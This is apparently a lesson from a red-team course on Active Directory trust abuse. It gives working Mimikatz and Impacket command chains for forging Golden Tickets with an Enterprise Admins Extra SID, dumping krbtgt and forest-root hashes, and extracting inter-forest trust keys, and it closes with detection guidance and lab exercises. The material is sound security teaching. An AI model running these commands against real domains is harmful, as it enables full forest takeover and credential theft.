---
title: "SID History Injection and Inter-Forest Trust Attacks"
tags: [red-team, SID-history, inter-forest, trust, domain-trust, Golden-Ticket,
  Extra-SID, Mimikatz, ATT&CK, T1134.005, T1187]
module: 08-RedTeam-03
day: 516
related_topics:
  - AS-REP Roasting (Day 515)
  - AdminSDHolder and DCShadow (Day 517)
  - Domain Dominance (Day 499)
  - AD Attack Path Analysis (Day 501)
---

# Day 516 — SID History Injection and Inter-Forest Trust Attacks

> "The hardest thing to explain to a client is why owning one domain
> means owning every domain in the forest — and sometimes the next forest
> over. SID history was designed for migrations. It is also a backdoor
> into every trusted domain. A Golden Ticket with an extra SID is a ticket
> that says 'I am also a Domain Admin in your other domain.' The DC
> validates it and issues a cross-domain service ticket. Every time."
>
> — Ghost

---

## Goals

Understand Active Directory trust relationships and their attack implications.
Understand SID History: what it is, why it exists, and how to abuse it.
Execute a cross-domain privilege escalation using Extra SID injection in a
Golden Ticket.
Understand child-to-parent domain escalation and inter-forest trust abuse.

**Prerequisites:** Day 499 (Golden Ticket, DCSync), Day 501 (BloodHound),
multi-domain lab environment.
**Time budget:** 4 hours.

---

## Part 1 — AD Trust Architecture

```
Active Directory trusts establish authentication relationships between domains.

Trust types:
  Parent-Child:    Automatic, bi-directional, transitive
                   child.corp.local ↔ corp.local (same forest)

  Tree-Root:       Automatic, bi-directional, transitive
                   partner.com ↔ corp.local (separate trees, same forest)

  Forest:          Manual, can be one-way or two-way, not transitive by default
                   partner.com ↔ corp.local (separate forests)

  External:        Manual, one-way or two-way, NTLM-only (not Kerberos)
                   legacy-domain.local ↔ corp.local

Transitivity:
  Intra-forest trusts ARE transitive:
    If A trusts B and B trusts C (same forest), then A trusts C.
  Inter-forest trusts are NOT transitive by default.

Attack implication:
  If you own the root domain (corp.local), you own every child domain
  (child.corp.local) because parent-child trusts are bi-directional and
  the Enterprise Admins group in the forest root has implicit DA in all domains.
  Conversely: owning a child domain → escalate to forest root (see Part 3).
```

---

## Part 2 — SID History: Design and Abuse

### What SID History Is

```
When a user is migrated from one domain to another, their old SID is stored
in the sIDHistory attribute of their new account.

During Kerberos authentication:
  The KDC includes all SIDs from sIDHistory in the PAC (Privilege Attribute
  Certificate) of the TGT.

Downstream domains check these SIDs against their local group memberships.
If any SID in the PAC matches a local group (e.g. Domain Admins in the
target domain), access is granted.

Abuse:
  If an attacker can add an arbitrary SID to a TGT's PAC, they can impersonate
  a member of any group in any trusted domain — including Domain Admins or
  Enterprise Admins in the forest root.
```

### Intra-Forest SID Filter Bypass

```
By default, intra-forest trusts do NOT filter the Extra SIDs in the PAC.
This is by design — the forest is considered a single security boundary.

Implication:
  A Domain Admin in child.corp.local can craft a TGT containing the
  Enterprise Admins SID (S-1-5-21-[FOREST_ROOT_DOMAIN_SID]-519)
  The corp.local DC accepts this SID and treats the holder as Enterprise Admin.
  → child.corp.local DA → corp.local Enterprise Admin
```

---

## Part 3 — Child-to-Parent Domain Escalation

### Prerequisites

```
You have compromised a child domain (child.corp.local):
  → You have child.corp.local DA
  → You can DCSync child.corp.local → extract child krbtgt hash

Information needed:
  1. Child domain krbtgt NTLM hash (from DCSync on child DC)
  2. Child domain SID
  3. Enterprise Admins SID (forest root SID + "-519")
  4. Forest root domain name
```

### Step 1: Gather Required Information

```bash
# DCSync child domain (from a compromised child DC):
mimikatz "lsadump::dcsync /domain:child.corp.local /user:krbtgt" exit
# → Note: NTLM hash, AES keys

# Get child domain SID:
python3 getPac.py -targetUser krbtgt child.corp.local/Administrator:Password123 \
    -dc-ip CHILD_DC_IP
# OR:
[Windows] > whoami /user
# → S-1-5-21-CHILD_DOMAIN_SID-500 (extract the domain SID part)

# Get forest root Enterprise Admins SID:
# Enterprise Admins always: S-1-5-21-[FOREST_ROOT_SID]-519
# Get forest root SID:
[Windows] > (Get-ADDomain corp.local).DomainSID.Value
# → S-1-5-21-ROOT_PART1-ROOT_PART2-ROOT_PART3
# Enterprise Admins SID: S-1-5-21-ROOT_PART1-ROOT_PART2-ROOT_PART3-519
```

### Step 2: Forge a Golden Ticket with Extra SID

```bash
# Forge a TGT for the child domain that includes the Enterprise Admins SID
# as an Extra SID in the PAC:

mimikatz "kerberos::golden \
    /user:Administrator \
    /domain:child.corp.local \
    /sid:S-1-5-21-CHILD_SID_PART1-CHILD_SID_PART2-CHILD_SID_PART3 \
    /krbtgt:CHILD_KRBTGT_NTLM_HASH \
    /sids:S-1-5-21-ROOT_SID_PART1-ROOT_SID_PART2-ROOT_SID_PART3-519 \
    /ptt" exit

# The /sids parameter adds the Enterprise Admins SID as an Extra SID
# This TGT will be accepted by corp.local DCs as evidence of EA membership

# Verify:
klist
# → TGT for Administrator in child.corp.local domain
# → Extra SIDs included: S-1-5-21-ROOT...-519 (Enterprise Admins)

# Access the forest root DC:
dir \\ROOT-DC.corp.local\C$
# → Success — authenticated as Enterprise Admin
```

### Complete Chain via Impacket

```bash
# From Kali, no Windows tooling required:
python3 ticketer.py \
    -nthash CHILD_KRBTGT_NTLM_HASH \
    -domain-sid S-1-5-21-CHILD_SID \
    -domain child.corp.local \
    -extra-sid S-1-5-21-ROOT_SID-519 \
    Administrator

export KRB5CCNAME=Administrator.ccache
python3 secretsdump.py -k -no-pass ROOT-DC.corp.local
# → Full forest root domain hash dump as Enterprise Admin
```

---

## Part 4 — Inter-Forest Trust Attack

Unlike intra-forest trusts, inter-forest trusts apply SID filtering by default.
This means Extra SIDs from the source forest are stripped unless the forest
trust is configured with SID filtering disabled (not default).

### What Inter-Forest Trust Allows (No SID Filter Bypass)

```
Even with SID filtering enabled, a one-way or two-way forest trust allows:
  → Access to resources in the trusted forest using your forest's credentials
  → Kerberos referral: your KDC issues a cross-forest referral ticket
  → The target forest's KDC issues a TGS for the resource

Attack scenarios with filtered trust:
  → Authenticate to a file server in partnerforest.com using corp.local creds
  → Access Exchange, web apps, SharePoint exposed across the trust
  → Credential reuse: if admin accounts exist in both forests with same password
  → Kerberoast service accounts in the trusted forest that have SPNs
```

### SID Filtering Disabled (Forest Trust with SID History Enabled)

```
Some forests disable SID filtering on their forest trust ("SIDHistory" enabled):
  netdom trust partnerforest.com /domain:corp.local /EnableSIDHistory:yes

If enabled: the Extra SID attack works cross-forest (same as intra-forest).
This is rare but documented in environments migrating users across forests.

Check: Get-ADTrust -Filter * | Select Name, SIDFilteringForestAware
If SIDFilteringForestAware = False: SID filtering is disabled = vulnerable.
```

### Cross-Forest Attack with Trust Key

```bash
# If you own the forest root and want to forge cross-forest tickets:
# Extract the inter-forest trust key (shared secret between forests):
mimikatz "lsadump::trust /patch" exit
# → Shows: trust key for each trusted domain/forest

# Forge a cross-forest inter-realm TGT using the trust key:
mimikatz "kerberos::golden \
    /user:Administrator \
    /domain:corp.local \
    /sid:S-1-5-21-CORP_SID \
    /rc4:TRUST_KEY_NTLM \
    /service:krbtgt \
    /target:partnerforest.com \
    /ptt" exit

# Request a TGS in the partner forest:
# (Kerberos referral to partner forest KDC using the forged ticket)
```

---

## Part 5 — Detection

```
SID History attribute modification:
  Event 4765: SID History was added to an account
  Event 4766: An attempt to add SID History to an account failed
  Alert on: any SID History addition not from a documented migration tool

Extra SID in Kerberos tickets:
  Event 4769 (Service Ticket): contains unusual SIDs in the PAC
  MDI (Microsoft Defender for Identity): "Suspected Golden Ticket usage"
    detects mismatched SID or extra SIDs not matching the account's group membership

Cross-forest Kerberos referrals:
  Unusual cross-domain Kerberos referrals to a forest root DC from a child domain
  in rapid succession (characteristic of Extra SID exploitation)

Trust key extraction:
  lsadump::trust generates Sysmon Event 10 (LSASS access) on the DC
  Also visible: registry reads on HKLM\SECURITY\Policy\Secrets\
```

---

## Key Takeaways

1. Owning a child domain means owning the forest. Parent-child trusts are
   transitive and bi-directional. A Golden Ticket with the Enterprise Admins
   Extra SID escalates from any child domain to full forest control. There
   is no forest-level firewall between child and parent by default.
2. SID History was designed for domain migrations. In a production AD, most
   organisations have no active migrations — meaning any sIDHistory attribute
   on a non-migration account is suspicious. Audit it regularly.
3. Inter-forest trusts apply SID filtering by default. This is a meaningful
   security boundary — unlike intra-forest trusts. Know which type of trust
   exists in the environment before planning a cross-forest attack.
4. The trust key (`lsadump::trust`) is as valuable as the krbtgt hash for
   cross-domain attacks. It allows forging inter-realm referral tickets that
   the target forest's KDC accepts.
5. Detection for Extra SID attacks requires MDI or a SIEM rule that validates
   PAC contents against known group memberships. Most SIEM products do not
   inspect the PAC by default — this is a known gap.

---

## Exercises

1. Set up a two-domain lab: `child.corp.local` (child) and `corp.local` (root).
   Confirm the parent-child trust is in place. Identify the Enterprise Admins
   SID from the root domain.
2. DCSync the child domain's krbtgt hash. Forge a Golden Ticket with the
   Enterprise Admins Extra SID using the `ticketer.py` + `secretsdump.py`
   chain. Verify access to the root domain DC.
3. Check `Get-ADTrust -Filter *` in the lab. Is SIDFilteringForestAware set?
   What would this mean for an inter-forest trust attack?
4. Write a Sigma rule for Event 4765 (SID History added to account) that fires
   for any sIDHistory modification outside a defined maintenance window.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q516.1, Q516.2 …).

---

## Navigation

← Previous: [Day 515 — AS-REP Roasting and Password Spraying](DAY-0515-ASREPRoasting-Password-Spraying.md)
→ Next: [Day 517 — AdminSDHolder and DCShadow](DAY-0517-AdminSDHolder-DCShadow.md)
